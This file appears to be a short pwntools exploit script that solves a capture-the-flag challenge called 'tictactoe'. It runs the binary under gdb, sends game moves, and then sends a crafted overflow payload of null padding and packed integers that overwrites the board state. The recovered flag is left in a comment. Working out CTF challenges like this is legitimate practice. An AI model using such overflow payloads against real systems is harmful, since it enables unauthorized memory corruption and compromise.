from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./tictactoe', 'b *0x401b36\ncontinue')

# p = remote('challenge.utctf.live', 7114)

p.sendline(b'x')
p.sendline(b'5')
p.sendline(b'3')
p.sendline(b'4')

p.sendline(b'9'+b'\0'*12+p32(2)*8+b'\0'*24+p32(1))

p.interactive()

# utflag{!pr0_g4m3r_4l3rt!}